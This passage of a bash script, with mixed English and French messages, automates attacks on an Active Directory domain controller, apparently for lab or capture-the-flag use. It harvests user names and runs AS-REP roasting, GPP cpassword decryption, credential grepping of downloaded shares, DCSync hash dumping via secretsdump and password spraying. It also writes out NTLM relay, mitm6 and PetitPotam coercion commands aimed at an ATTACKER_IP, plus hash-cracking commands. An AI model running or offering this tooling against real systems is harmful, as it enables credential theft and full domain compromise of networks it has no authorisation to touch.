        | tee enum4linux/enum4linux_ng.log >/dev/null || true
    fi

    local json_file="${json_out}.json"
    if [ -s "$json_file" ] && have jq; then
      good "Parsing enum4linux-ng JSON output with jq..."

      # Extract password policy when present.
      log "  >> Password policy:"
      jq -r '
        .password_policy // empty |
        to_entries[] |
        "    \(.key): \(.value)"
      ' "$json_file" 2>/dev/null | tee enum4linux/passpol.txt || true

      if [ -s enum4linux/passpol.txt ]; then
        good "Password policy extracted:"
        cat enum4linux/passpol.txt
        # Warn before any spray/bruteforce-style follow-up.
        local lockout_thresh
        lockout_thresh="$(jq -r '.password_policy.lockout_threshold // 0' "$json_file" 2>/dev/null || echo 0)"
        if [ "$lockout_thresh" != "0" ] && [ "$lockout_thresh" != "null" ]; then
          bad "LOCKOUT THRESHOLD = ${lockout_thresh} -> be careful with password spraying!"
        else
          good "No lockout threshold detected -> spraying safer."
        fi
      fi

      # --- Users ---
      jq -r '
        .users // {} |
        to_entries[] |
        .value.username // empty
      ' "$json_file" 2>/dev/null | sort -u > users_enum4linux.txt || true

      # Also try alternate key structure
      if [ ! -s users_enum4linux.txt ]; then
        jq -r '
          .. | objects | .username? // empty
        ' "$json_file" 2>/dev/null | sort -u > users_enum4linux.txt || true
      fi

      good "enum4linux-ng users extracted (jq): $(wc -l < users_enum4linux.txt 2>/dev/null || echo 0)"
      [ -s users_enum4linux.txt ] && cat users_enum4linux.txt | sed 's/^/  - /'

      # --- Groups ---
      jq -r '
        .groups // {} |
        to_entries[] |
        "  \(.value.groupname // .key) [rid:\(.value.rid // "?")]"
      ' "$json_file" 2>/dev/null | tee enum4linux/groups.txt || true
      if [ -s enum4linux/groups.txt ]; then
        good "Groups found:"
        cat enum4linux/groups.txt
      fi

      # --- Shares ---
      jq -r '
        .shares // {} |
        to_entries[] |
        "  \(.key) [\(.value.access // "?")]"
      ' "$json_file" 2>/dev/null | tee enum4linux/shares.txt || true
      if [ -s enum4linux/shares.txt ]; then
        good "Shares found:"
        cat enum4linux/shares.txt
      fi

      # --- OS info ---
      jq -r '
        .smb_domain_info // {} |
        to_entries[] |
        "  \(.key): \(.value)"
      ' "$json_file" 2>/dev/null | tee enum4linux/os_info.txt || true
      if [ -s enum4linux/os_info.txt ]; then
        good "OS/Domain info:"
        cat enum4linux/os_info.txt
      fi

      # --- Domain SID ---
      local domain_sid
      domain_sid="$(jq -r '.domain_sid // empty' "$json_file" 2>/dev/null || true)"
      if [ -n "${domain_sid:-}" ]; then
        good "Domain SID: ${domain_sid}"
        echo "$domain_sid" > enum4linux/domain_sid.txt
      fi

    elif [ -s "$json_file" ] && ! have jq; then
      # Fallback: grep parse the raw JSON (no jq)
      log "jq not available -> fallback grep parsing on JSON..."
      grep -oP '"username"\s*:\s*"\K[^"]+' "$json_file" 2>/dev/null | sort -u > users_enum4linux.txt || true
      grep -oP '"min_pw_length"\s*:\s*\K[0-9]+' "$json_file" 2>/dev/null | head -1 \
        | xargs -I{} echo "min_pw_length: {}" >> enum4linux/passpol.txt || true
      grep -oP '"lockout_threshold"\s*:\s*\K[0-9]+' "$json_file" 2>/dev/null | head -1 \
        | xargs -I{} echo "lockout_threshold: {}" >> enum4linux/passpol.txt || true
      good "enum4linux-ng users (grep fallback): $(wc -l < users_enum4linux.txt 2>/dev/null || echo 0)"
    else
      bad "Sortie JSON enum4linux-ng introuvable ou vide : $json_file"
    fi

  else
    # Fallback: text mode (old enum4linux-ng without -oJ)
    log "enum4linux-ng does not support -oJ -> falling back to text mode"
    if [ "$AUTH_MODE" = "1" ] && [ "$AUTH_OK" = "1" ]; then
      local U="$AD_USER_BEST"
      U="${U##*\\}"; U="${U%@*}"
      enum4linux-ng $e4l_args -u "$U" -p "$AD_PASS" "$TARGET" 2>&1 | tee enum4linux/enum4linux_ng.txt | mask_pass >/dev/null || true
    else
      enum4linux-ng $e4l_args "$TARGET" 2>&1 | tee enum4linux/enum4linux_ng.txt >/dev/null || true
    fi

    # Structured parsing of text output
    # Password policy section
    awk '/\[+\] Password Policy/,/^\[/' enum4linux/enum4linux_ng.txt 2>/dev/null \
      | grep -vE '^\[' | sed '/^$/d' > enum4linux/passpol.txt || true

    # Users - look for explicit user lines
    grep -Eo "username:[[:space:]]*[A-Za-z][A-Za-z0-9._-]{1,31}" enum4linux/enum4linux_ng.txt 2>/dev/null \
      | awk -F':[[:space:]]*' '{print $2}' | sort -u > users_enum4linux.txt || true

    if [ ! -s users_enum4linux.txt ]; then
      grep -Eo "user:\[[A-Za-z][A-Za-z0-9._-]{1,31}\]" enum4linux/enum4linux_ng.txt 2>/dev/null \
        | tr -d '[]' | awk -F: '{print $2}' | sort -u > users_enum4linux.txt || true
    fi

    good "enum4linux-ng users (text fallback): $(wc -l < users_enum4linux.txt 2>/dev/null || echo 0)"
  fi

  # Always print password policy summary if we have it
  if [ -s enum4linux/passpol.txt ]; then
    good "Password policy summary:"
    cat enum4linux/passpol.txt | sed 's/^/  /'
  fi
}

# ============================================================
# Users harvesting
# ============================================================
harvest_users() {
  section "Phase 4: User Harvesting from Downloads"
  : > users_smb.txt

  if [ -d downloads ]; then
    grep -RHiE '(^|[^a-z])((user(name)?|login|account)\s*[:=]\s*|runas\s+/user:|net\s+user\s+)' downloads 2>/dev/null \
      | sed -E 's/.*(user(name)?|login|account)[[:space:]]*[:=][[:space:]]*//I; s/.*runas[[:space:]]+\/user://I; s/.*net[[:space:]]+user[[:space:]]+//I' \
      | sed -E 's/[[:space:]].*$//; s/[\\\/"].*$//; s/[;,#].*$//' \
      | tr -d '\r' \
      | grep -E '^[A-Za-z][A-Za-z0-9._-]{1,31}$' \
      | sort -u >> users_smb.txt || true

    if [ "$STRICT_USERS" = "0" ]; then
      grep -RHoE '[A-Za-z][A-Za-z0-9._-]{2,20}' downloads 2>/dev/null | tr -d '\r' | sort -u > smb_tokens_all.txt || true
      if [ -s smb_tokens_all.txt ]; then
        grep -vE '^(the|and|for|from|with|this|that|true|false|null|admin|administrator|guest|domain|configuration|schema|dns|forest|group|groups|policy|script|powershell|windows|microsoft|service|system|users|public|default|netlogon|sysvol|htb)$' smb_tokens_all.txt \
          | sort -u >> users_smb.txt || true
      fi
    fi

    sort -u users_smb.txt | sed '/^$/d' > users_smb.clean.txt
    mv users_smb.clean.txt users_smb.txt
  fi
}

# ============================================================
# Merge users + ASREP
# ============================================================
merge_and_asrep() {
  section "Phase 5: Merge Users + AS-REP Roast"
  cat users_rpc.txt users_ldap.txt users_smb.txt users_rpc_auth.txt users_ldap_auth.txt users_kerb.txt users_enum4linux.txt 2>/dev/null \
    | tr -d '\r' | sed 's/^[[:space:]]\+//; s/[[:space:]]\+$//' | sed '/^$/d' | sort -u > users.txt || true

  grep -E '^[A-Za-z][A-Za-z0-9._-]{1,31}$' users.txt \
    | grep -viE '^(sysvol|netlogon|domain|configuration|schema|dns|forest|windows|microsoft|policy|group|groups|users|public|default|service|system|admin|administrator|guest)$' \
    | sort -u > users.cleaned.txt || true
  mv users.cleaned.txt users.txt
  good "users.txt count (cleaned): $(wc -l < users.txt 2>/dev/null || echo 0)"
  [ -s users.txt ] && cat users.txt | sed 's/^/  - /'

  if [ "$DO_ASREP" = "1" ] && [ -s users.txt ] && [ -n "${GETNPUSERS_BIN:-}" ]; then
    log "Running AS-REP Roast..."
    "${GETNPUSERS_BIN:-impacket-GetNPUsers}" "$DOMAIN/" -dc-ip "$TARGET" -no-pass -usersfile users.txt 2>&1 \
      | tee asrep_roast_raw.txt \
      | grep -v "KDC_ERR_C_PRINCIPAL_UNKNOWN" \
      | tee asrep_roast.txt || true

    local hash_count
    hash_count="$(grep -c '^\$krb5asrep\$' asrep_roast.txt 2>/dev/null || echo 0)"
    if [ "$hash_count" -gt 0 ]; then
      good "AS-REP hashes captured: ${hash_count}"
      grep '^\$krb5asrep\$' asrep_roast.txt | sed 's/^/  >> /'
    else
      log "Aucun hash AS-REP (tous les comptes exigent la pré-auth ou utilisateurs introuvables)."
    fi
  else
    : > asrep_roast_raw.txt
    : > asrep_roast.txt
    log "GetNPUsers ignoré (DO_ASREP=0, pas d'utilisateurs, ou outil indisponible)."
  fi
}

final_summary() {
  section "Résumé"
  local users_count asrep_count shares_count tooling_present tooling_installed tooling_failed kerberoast_count
  users_count="$(wc -l < users.txt 2>/dev/null || echo 0)"
  asrep_count="$(grep -c '^\$krb5asrep\$' asrep_roast.txt 2>/dev/null || echo 0)"
  shares_count="$(wc -l < smb_shares/shares_target.txt 2>/dev/null || echo 0)"
  kerberoast_count="$(grep -c '^\$krb5tgs\$' kerberos/kerberoast_hashes.txt 2>/dev/null || echo 0)"
  tooling_present="$(printf "%s" "${TOOLING_SUMMARY:-}" | grep -c '^\[OK\]' 2>/dev/null || echo 0)"
  tooling_installed="$(printf "%s" "${TOOLING_SUMMARY:-}" | grep -c '^\[INST\]' 2>/dev/null || echo 0)"
  tooling_failed="$(printf "%s" "${TOOLING_SUMMARY:-}" | grep -c '^\[FAIL\]\|^\[MISS\]' 2>/dev/null || echo 0)"

  {
    echo "Résumé de l'outillage"
    echo "Generated: $(date)"
    echo "Profile: $RUN_PROFILE"
    echo "Phase pack: $PHASE_PACK"
    echo "----------------------------------------"
    tooling_summary_block
  } > tooling_summary.txt

  {
    echo "=================================================="
    echo "  ENUMERATION SUMMARY - $(date)"
    echo "=================================================="
    echo "Target:          $TARGET"
    echo "Domain:          $DOMAIN"
    echo "DC:              $DC"
    echo "Profile:         $RUN_PROFILE"
    echo "Phase pack:      $PHASE_PACK"
    echo "Auth mode:       $AUTH_MODE"
    echo "--------------------------------------------------"
    echo "Auth results:"
    echo "  SMB=$SMB_AUTH_OK  LDAP=$LDAP_AUTH_OK  RPC=$RPC_AUTH_OK"
    echo "  WINRM=$WINRM_AUTH_OK  MSSQL=$MSSQL_AUTH_OK"
    echo "  TGT_OK=$GETTGT_OK"
    echo "  SMB_SIGNING_REQUIRED=$SMB_SIGNING_REQUIRED"
    echo "--------------------------------------------------"
    echo "Recon:"
    echo "  NMAP=$NMAP_DONE  NTP=$NTP_SYNC_DONE  WEB=$WEB_ENUM_DONE"
    echo "  BLOODHOUND=$BLOODHOUND_OK  LDAPDOMAINDUMP=$LDAPDOMAINDUMP_DONE DNS=$DNS_ENUM_DONE"
    echo "  ADCS=$ADCS_ENUM_DONE BLOODYAD=$BLOODYAD_ENUM_DONE MSSQL=$MSSQL_ENUM_DONE WINRM_HINTS=$WINRM_SHELL_DONE GPO_PARSE=$GPO_PARSE_DONE"
    echo "  SECRETSDUMP=$SECRETSDUMP_DONE SNMP=$SNMP_ENUM_DONE FTP=$FTP_ENUM_DONE SPRAY=$SPRAY_DONE LDAPS=$LDAPS_ENUM_DONE"
    echo "--------------------------------------------------"
    echo "Findings:"
    echo "  Shares selected:      $shares_count"
    echo "  Users discovered:     $users_count"
    echo "  AS-REP hashes:        $asrep_count"
    echo "  Kerberoast hashes:    $kerberoast_count"
    echo "--------------------------------------------------"
    echo "Tooling:"
    echo "  Present:              $tooling_present"
    echo "  Auto-installed:       $tooling_installed"
    echo "  Failed/missing:       $tooling_failed"
    echo "  See:                  tooling_summary.txt"
    if [ -s enum4linux/passpol.txt ]; then
      echo "--------------------------------------------------"
      echo "Password Policy:"
      cat enum4linux/passpol.txt | sed 's/^/  /'
    fi
    if [ -s ldap_asrep_candidates.txt ]; then
      echo "--------------------------------------------------"
      echo "ASREPRoastable (LDAP):"
      cat ldap_asrep_candidates.txt | sed 's/^/  >> /'
    fi
    if [ -s ldap_kerberoastable.txt ]; then
      echo "--------------------------------------------------"
      local kerb_count
      kerb_count="$(grep -c "^sAMAccountName:" ldap_kerberoastable.txt 2>/dev/null || echo 0)"
      echo "Kerberoastable accounts: $kerb_count (see ldap_kerberoastable.txt)"
    fi
    if [ -s ldap_admincount.txt ]; then
      echo "--------------------------------------------------"
      echo "Privileged accounts (adminCount=1):"
      cat ldap_admincount.txt | sed 's/^/  >> /'
    fi
    echo "--------------------------------------------------"
    echo "Fichiers clés :"
    echo "  users.txt             asrep_roast.txt"
    echo "  enum4linux/           ldap_*.txt"
    echo "  ldapdomaindump/       smb_enum*.txt"
    echo "  dns_enum/             kerberos/          adcs/"
    echo "  bloodyad/             mssql_enum/        winrm_enum/"
    echo "  gpo/                  bloodhound_collect.txt"
    echo "  smb_shares/*          downloads/*"
    echo "  dotnet_juicy.txt      attack_checks/*"
    echo "  tooling_summary.txt"
    echo "  nmapresult.*"
    echo "=================================================="
  } | tee summary.txt
  good "Résumé écrit : summary.txt"
}

# ============================================================
# Loot hints
# ============================================================
loot_hints() {
  section "Phase 6: Loot Hints (GPP + Creds Patterns)"
  grep -RHiE 'cpassword|Groups\.xml|Services\.xml|Scheduledtasks\.xml|Printers\.xml|Drives\.xml' downloads 2>/dev/null \
    | tee gpp_hits.txt >/dev/null || true
  if [ -s gpp_hits.txt ]; then
    bad "GPP passwords found! See gpp_hits.txt"
    # Auto-decrypt if gpp-decrypt available
    if have gpp-decrypt; then
      grep -oP 'cpassword="\K[^"]+' gpp_hits.txt 2>/dev/null | while IFS= read -r cpwd; do
        log "Decrypting GPP cpassword..."
        gpp-decrypt "$cpwd" 2>/dev/null || true
      done | tee gpp_decrypted.txt || true
      [ -s gpp_decrypted.txt ] && good "GPP decrypted passwords: gpp_decrypted.txt"
    fi
  fi

  grep -RHiE 'pass(word)?|pwd|secret|token|apikey|api[_-]?key|key=|connectionStrings|connectionString|Data Source=|User ID=|UID=|Password=|PWD=' downloads 2>/dev/null \
    | tee creds_hits.txt >/dev/null || true
  if [ -s creds_hits.txt ]; then
    good "Motifs d'identifiants trouvés : creds_hits.txt ($(wc -l < creds_hits.txt) lignes)"
  fi
}

# ============================================================
# SMB Signing Check
# ============================================================
phase_smb_signing_check() {
  if [ "$SMB_SIGNING" != "1" ]; then
    log "SMB_SIGNING=0 -> skipping SMB signing check"
    return
  fi

  section "Phase R1: SMB Signing Check"

  if [ "$NXC_HAS" = "1" ] && echo "$NXC_MODULES" | grep -qw "smb"; then
    if nxc_has_opt "$NXC_SMB_HELP" "--gen-relay-list"; then
      log "Generating relay list (nxc smb --gen-relay-list)..."
      nxc smb "$TARGET" --gen-relay-list attack_checks/smb_relay_targets.txt 2>&1 \
        | tee attack_checks/smb_signing_check.txt >/dev/null || true
      if [ -s attack_checks/smb_relay_targets.txt ]; then
        good "SMB relay targets (signing disabled): $(wc -l < attack_checks/smb_relay_targets.txt) host(s)"
        cat attack_checks/smb_relay_targets.txt | sed 's/^/  - /'
        echo "1" > attack_checks/smb_signing_disabled.flag
      fi
    else
      nxc smb "$TARGET" 2>&1 | tee attack_checks/smb_signing_check.txt >/dev/null || true
      if grep -qiE "signing:False|Signing: False" attack_checks/smb_signing_check.txt 2>/dev/null; then
        good "SMB signing DISABLED on $TARGET -> relay attacks possible!"
        echo "1" > attack_checks/smb_signing_disabled.flag
      elif grep -qiE "signing:True|Signing: True" attack_checks/smb_signing_check.txt 2>/dev/null; then
        log "SMB signing ENABLED on $TARGET -> direct relay not possible."
        SMB_SIGNING_REQUIRED=1
      fi
    fi
  elif have nmap; then
    log "Checking SMB signing via nmap script..."
    nmap -p 445 --script smb2-security-mode "$TARGET" -oN attack_checks/smb_signing_nmap.txt 2>/dev/null || true
    if grep -qiE "message signing enabled but not required" attack_checks/smb_signing_nmap.txt 2>/dev/null; then
      good "SMB signing not required -> relay attacks possible!"
      echo "1" > attack_checks/smb_signing_disabled.flag
    fi
  fi
}

# ============================================================
# LDAPS Probe (port 636)
# ============================================================
phase_ldaps_enum() {
  if [ "$LDAPS_ENUM" != "1" ]; then
    log "LDAPS_ENUM=0 -> skipping LDAPS probe"
    return
  fi
  if ! have ldapsearch; then
    log "ldapsearch introuvable -> sonde LDAPS ignorée"
    return
  fi

  section "Phase 2d : énumération LDAPS (port 636)"

  local BASE_DN="${LDAP_BASE_DN:-}"
  if [ -z "$BASE_DN" ]; then
    BASE_DN="$(echo "$DOMAIN" | awk -F'.' '{for(i=1;i<=NF;i++){printf "DC=%s%s",$i,(i<NF?",":"")}}')"
  fi

  log "Probing LDAPS (ldaps://$TARGET:636)..."
  ldapsearch -x -H "ldaps://$TARGET:636" -s base namingcontexts 2>&1 \
    | tee ldap_ldaps_probe.txt >/dev/null || true

  if grep -qiE "namingContexts:|result: 0" ldap_ldaps_probe.txt 2>/dev/null; then
    good "LDAPS port 636 is accessible."
    LDAPS_ENUM_DONE=1

    if [ "$LDAP_AUTH_OK" = "1" ]; then
      local U="$AD_USER_BEST"
      local U_SHORT
      U_SHORT="$(normalize_user_short "$U")"
      log "LDAPS authenticated dump (users)..."
      ldapsearch -x -H "ldaps://$TARGET:636" -D "${U_SHORT}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
        "(objectClass=user)" sAMAccountName memberOf 2>/dev/null \
        | tee ldap_ldaps_users.txt | mask_pass >/dev/null || true
      local count
      count="$(grep -c "^sAMAccountName:" ldap_ldaps_users.txt 2>/dev/null || echo 0)"
      good "LDAPS authenticated users: $count"
    fi
  else
    log "LDAPS port 636 not accessible or requires special cert."
  fi
}

# ============================================================
# Énumération SNMP
# ============================================================
phase_snmp_enum() {
  if [ "$SNMP_ENUM" != "1" ]; then
    log "SNMP_ENUM=0 -> skipping SNMP enumeration"
    return
  fi

  section "Phase R2 : énumération SNMP"

  local communities=("public" "private" "community" "manager" "snmpd" "cisco" "default")
  local snmp_found=0

  if have onesixtyone; then
    log "Running onesixtyone community string brute..."
    printf '%s\n' "${communities[@]}" > snmp_enum/communities.txt
    onesixtyone -c snmp_enum/communities.txt "$TARGET" 2>&1 \
      | tee snmp_enum/onesixtyone.txt >/dev/null || true
    if grep -q "\[" snmp_enum/onesixtyone.txt 2>/dev/null; then
      snmp_found=1
      good "SNMP community string(s) found!"
      grep "\[" snmp_enum/onesixtyone.txt | sed 's/^/  >> /'
    fi
  fi

  if have snmpwalk; then
    for community in "${communities[@]}"; do
      log "Trying snmpwalk with community: $community"
      timeout 10 snmpwalk -v2c -c "$community" "$TARGET" 2>&1 \
        | tee "snmp_enum/snmpwalk_${community}.txt" >/dev/null || true
      if [ -s "snmp_enum/snmpwalk_${community}.txt" ] && \
         ! grep -qiE "timeout|no response|no such variable|error" "snmp_enum/snmpwalk_${community}.txt" 2>/dev/null; then
        snmp_found=1
        good "SNMP v2c works with community: $community"

        # Extract users/hostnames/processes
        grep -E "sysDescr|sysName|hrSWRunName|host\.hr|iso\.3\.6\.1\.4\.1\.77" \
          "snmp_enum/snmpwalk_${community}.txt" 2>/dev/null \
          | head -30 >> snmp_enum/snmp_juicy.txt || true

        snmpwalk -v2c -c "$community" "$TARGET" 1.3.6.1.4.1.77.1.2.25 2>/dev/null \
          | grep -oP '"[^"]+"' | tr -d '"' | sort -u \
          >> snmp_enum/snmp_users.txt 2>/dev/null || true
        break
      fi
    done

    if [ -s snmp_enum/snmp_users.txt ]; then
      good "SNMP users harvested: $(wc -l < snmp_enum/snmp_users.txt)"
      cat snmp_enum/snmp_users.txt | sed 's/^/  - /' | head -20
      cat snmp_enum/snmp_users.txt >> users_smb.txt 2>/dev/null || true
    fi
  fi

  if [ "$snmp_found" = "0" ]; then
    log "No SNMP community strings found or tool unavailable."
  else
    SNMP_ENUM_DONE=1
  fi
}

# ============================================================
# Énumération FTP
# ============================================================
phase_ftp_enum() {
  if [ "$FTP_ENUM" != "1" ]; then
    log "FTP_ENUM=0 -> skipping FTP enumeration"
    return
  fi

  # Only run if port 21 open (nmap result) or no nmap done
  if [ -s nmapresult.txt ] && ! grep -qE '(^|[[:space:]])21/tcp[[:space:]]+open' nmapresult.txt 2>/dev/null; then
    log "Port 21 not open (nmap) -> skipping FTP enumeration"
    return
  fi

  section "Phase R3 : énumération FTP"

  if have curl; then
    log "FTP banner + anonymous login (curl)..."
    curl -s --max-time 10 "ftp://$TARGET/" --user "anonymous:anonymous@$TARGET" \
      -v 2>&1 | tee ftp_enum/ftp_anon.txt >/dev/null || true

    if grep -qiE "230|login successful|directory" ftp_enum/ftp_anon.txt 2>/dev/null; then
      good "FTP anonymous login WORKS!"
      FTP_ENUM_DONE=1

      log "Listing FTP root..."
      curl -s --max-time 15 "ftp://$TARGET/" --user "anonymous:anonymous@$TARGET" \
        2>&1 | tee ftp_enum/ftp_listing.txt || true

      if [ "$AUTH_MODE" = "1" ] && [ "$AUTH_OK" = "1" ]; then
        local U="${AD_USER_BEST##*\\}"
        U="${U%@*}"
        log "Attempting FTP download with AD credentials..."
        curl -s --max-time 20 "ftp://$TARGET/" --user "${U}:${AD_PASS}" \
          2>&1 | tee ftp_enum/ftp_auth_listing.txt | mask_pass >/dev/null || true
      fi
    else
      log "FTP anonymous login not available."
      if [ "$AUTH_MODE" = "1" ] && [ "$AUTH_OK" = "1" ]; then
        local U="${AD_USER_BEST##*\\}"
        U="${U%@*}"
        log "Trying FTP with AD credentials..."
        curl -s --max-time 15 "ftp://$TARGET/" --user "${U}:${AD_PASS}" \
          2>&1 | tee ftp_enum/ftp_auth_listing.txt | mask_pass >/dev/null || true
        if grep -qiE "230|login successful|directory" ftp_enum/ftp_auth_listing.txt 2>/dev/null; then
          good "FTP works with AD credentials!"
          FTP_ENUM_DONE=1
        fi
      fi
    fi
  elif have ftp; then
    log "FTP anonymous banner check..."
    printf "anonymous\nanonymous\nls\nquit\n" | timeout 10 ftp -n "$TARGET" 2>&1 \
      | tee ftp_enum/ftp_anon.txt >/dev/null || true
    grep -qiE "230|login successful" ftp_enum/ftp_anon.txt 2>/dev/null \
      && { good "FTP anonymous login WORKS!"; FTP_ENUM_DONE=1; } || true
  else
    log "Aucun client FTP trouvé (curl/ftp). Énumération FTP ignorée."
  fi
}

# ============================================================
# Secretsdump (DCSync / SAM)
# ============================================================
phase_secretsdump() {
  if [ "$SECRETSDUMP" != "1" ]; then
    log "SECRETSDUMP=0 -> skipping secretsdump"
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || [ "$AUTH_OK" != "1" ]; then
    log "secretsdump ignoré (pas d'identifiants confirmés)."
    return
  fi

  local secretsdump_bin=""
  if have impacket-secretsdump; then
    secretsdump_bin="impacket-secretsdump"
  elif have secretsdump.py; then
    secretsdump_bin="secretsdump.py"
  else
    log "impacket-secretsdump introuvable -> ignoré"
    return
  fi

  # Only run if we have Domain Admin / Backup Operator rights signals
  local run_dcsync=0
  if [ -s attack_checks/smb_auth_test.txt ] && \
     grep -qiE "(Pwn3d!|Pwned!|Domain Admins|Domain Admin)" attack_checks/smb_auth_test.txt 2>/dev/null; then
    run_dcsync=1
    good "Domain Admin/Pwned signal detected -> running DCSync!"
  elif [ -s bloodyad/writable.txt ] && \
     grep -qiE "(DCSync|replication|GetChanges|GenericAll.*Domain)" bloodyad/writable.txt 2>/dev/null; then
    run_dcsync=1
    good "DCSync rights detected via bloodyAD -> running secretsdump!"
  elif [ "$AUTH_OK" = "1" ]; then
    log "No explicit Domain Admin signal, trying secretsdump anyway (may fail or return partial)..."
    run_dcsync=1
  fi

  if [ "$run_dcsync" = "1" ]; then
    section "Phase 7a: secretsdump (DCSync / SAM)"
    local U="$AD_USER_BEST"
    U="${U##*\\}"
    U="${U%@*}"

    log "Running DCSync (NTDS.dit)..."
    run_save "attack_checks/secretsdump_dcsync.txt" \
      "$secretsdump_bin" "${DOMAIN}/${U}:${AD_PASS}@${TARGET}" -just-dc-ntlm || true

    if grep -qiE "^[^:]+:[0-9]+:[a-f0-9]{32}:" attack_checks/secretsdump_dcsync.txt 2>/dev/null; then
      SECRETSDUMP_DONE=1
      good "DCSync hashes captured! -> attack_checks/secretsdump_dcsync.txt"
      grep -oP "^[^:]+(?=:[0-9]+:[a-f0-9]{32}:)" attack_checks/secretsdump_dcsync.txt \
        | sort -u > attack_checks/secretsdump_accounts.txt 2>/dev/null || true
      local hash_count
      hash_count="$(grep -c "^[^:]*:[0-9]*:[a-f0-9]\{32\}:" attack_checks/secretsdump_dcsync.txt 2>/dev/null || echo 0)"
      good "Hashes dumped: $hash_count"
    else
      log "DCSync did not return hashes (may need higher privileges)."
      log "Trying SAM dump (local)..."
      run_save "attack_checks/secretsdump_sam.txt" \
        "$secretsdump_bin" "${DOMAIN}/${U}:${AD_PASS}@${TARGET}" -just-dc-user Administrator || true
    fi
  fi
}

# ============================================================
# Password Spray (opt-in, lockout-aware)
# ============================================================
phase_password_spray() {
  if [ "$SPRAY" != "1" ]; then
    log "SPRAY=0 -> skipping password spray"
    return
  fi
  if [ -z "${SPRAY_PASS:-}" ]; then
    log "SPRAY_PASS not set -> skipping password spray"
    return
  fi
  if [ ! -s users.txt ]; then
    log "No users.txt -> skipping password spray"
    return
  fi
  if [ "$NXC_HAS" != "1" ]; then
    log "nxc introuvable -> password spray ignoré"
    return
  fi

  section "Phase 8: Password Spray"

  # Lockout threshold check
  local lockout_threshold=0
  if [ -s enum4linux/passpol.txt ]; then
    lockout_threshold="$(grep -i "lockout_threshold" enum4linux/passpol.txt 2>/dev/null \
      | grep -oP '[0-9]+' | head -1 || echo 0)"
  fi

  if [ "${lockout_threshold:-0}" != "0" ] && [ "${lockout_threshold:-0}" != "null" ]; then
    bad "WARNING: Lockout threshold = ${lockout_threshold} attempts!"
    bad "Password spray may LOCK OUT accounts. Proceed with extreme caution."
    if [ -t 0 ]; then
      local confirm
      read -rp "Type 'SPRAY' to confirm password spray despite lockout risk: " confirm
      if [ "${confirm:-}" != "SPRAY" ]; then
        log "Password spray cancelled."
        return
      fi
    else
      log "Non-interactive mode with lockout threshold -> spray cancelled."
      return
    fi
  fi

  local spray_out="attack_checks/spray_results.txt"
  log "Spraying '${SPRAY_PASS}' against $(wc -l < users.txt) users..."
  nxc smb "$TARGET" -u users.txt -p "$SPRAY_PASS" -d "$DOMAIN" --continue-on-success \
    2>&1 | tee "$spray_out" | mask_pass >/dev/null || true

  local hits
  hits="$(grep -iE "(\+|pwned!)" "$spray_out" 2>/dev/null | wc -l || echo 0)"
  if [ "$hits" -gt 0 ]; then
    SPRAY_DONE=1
    good "Password spray HIT! $hits account(s) found:"
    grep -iE "(\+|pwned!)" "$spray_out" | sed 's/^/  >> /'
  else
    log "Password spray: no valid accounts found."
  fi
}

# ============================================================
# NTLM Relay Hints
# ============================================================
phase_relay_hints() {
  if [ "$RELAY_HINTS" != "1" ]; then
    log "RELAY_HINTS=0 -> skipping relay hints"
    return
  fi

  section "Phase R4: NTLM Relay Attack Hints"
  local relay_file="relay_hints/ntlm_relay_commands.txt"

  {
    echo "# NTLM Relay Attack Setup"
    echo "# Generated: $(date)"
    echo "# Target: $TARGET | Domain: $DOMAIN"
    echo ""
    if [ -s attack_checks/smb_signing_disabled.flag ]; then
      echo "# [!] SMB signing DISABLED -> SMB relay POSSIBLE"
    else
      echo "# [~] SMB signing may be required -> use LDAP/HTTP relay instead"
    fi
    echo ""
    echo "## Step 1: Disable SMB/HTTP in Responder (use config)"
    echo "# sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf"
    echo ""
    echo "## Step 2: Start Responder"
    echo "responder -I tun0 -v"
    echo ""
    echo "## Step 3: Start ntlmrelayx (SMB -> SMB)"
    echo "impacket-ntlmrelayx -t smb://$TARGET -smb2support"
    echo ""
    echo "## Step 3 (alt): Relay to LDAP for User creation / DCSync"
    echo "impacket-ntlmrelayx -t ldap://$TARGET --escalate-user '$AD_USER_RAW'"
    echo "impacket-ntlmrelayx -t ldaps://$TARGET --add-computer EVILPC$ --delegate-access"
    echo ""
    echo "## mitm6 (IPv6 DNS takeover -> relay to LDAP)"
    echo "mitm6 -d $DOMAIN"
    echo "impacket-ntlmrelayx -6 -t ldaps://$TARGET --add-computer EVILPC\$ --delegate-access"
    echo ""
    echo "## Step 4: Monitor for relay success"
    echo "# Look for SUCCEED lines in ntlmrelayx output"
    echo ""
    echo "## Printer Bug / PetitPotam coercion"
    if [ -n "${AD_USER_BEST:-}" ]; then
      echo "impacket-printerbug '${DOMAIN}/${AD_USER_BEST##*\\}:${AD_PASS}@${DC}' \$(hostname -I | awk '{print \$1}')"
      echo "impacket-PetitPotam '${DOMAIN}/${AD_USER_BEST##*\\}:${AD_PASS}' \$(hostname -I | awk '{print \$1}') $TARGET"
    else
      echo "impacket-printerbug '$DOMAIN/user:password@$DC' <ATTACKER_IP>"
      echo "impacket-PetitPotam '$DOMAIN/user:password' <ATTACKER_IP> $TARGET"
    fi
  } > "$relay_file"

  good "NTLM relay hints -> $relay_file"
}

# ============================================================
# Hints de cassage de hash
# ============================================================
phase_hash_crack_hints() {
  if [ "$HASH_HINTS" != "1" ]; then
    log "HASH_HINTS=0 -> skipping hash cracking hints"
    return
  fi

  section "Phase 9 : hints de cassage de hash"
  local hints_file="attack_checks/hash_crack_hints.txt"
  local rockyou="/usr/share/wordlists/rockyou.txt"
  local found_any=0

  {
    echo "# Référence de commandes pour le cassage de hash"
    echo "# Generated: $(date)"
    echo ""
  } > "$hints_file"

  if [ -s asrep_roast.txt ] && grep -q '^\$krb5asrep\$' asrep_roast.txt 2>/dev/null; then
    found_any=1
    local count
    count="$(grep -c '^\$krb5asrep\$' asrep_roast.txt 2>/dev/null || echo 0)"
    good "AS-REP hashes ($count) -> hashcat mode 18200"
    {
      echo "## AS-REP Roast (hashcat mode 18200)"
      echo "hashcat -m 18200 asrep_roast.txt $rockyou --force"
      echo "john --wordlist=$rockyou asrep_roast.txt"
      echo ""
    } >> "$hints_file"
  fi

  if [ -s kerberos/kerberoast_hashes.txt ] && grep -q '^\$krb5tgs\$' kerberos/kerberoast_hashes.txt 2>/dev/null; then
    found_any=1
    local count
    count="$(grep -c '^\$krb5tgs\$' kerberos/kerberoast_hashes.txt 2>/dev/null || echo 0)"
    good "Kerberoast TGS hashes ($count) -> hashcat mode 13100"
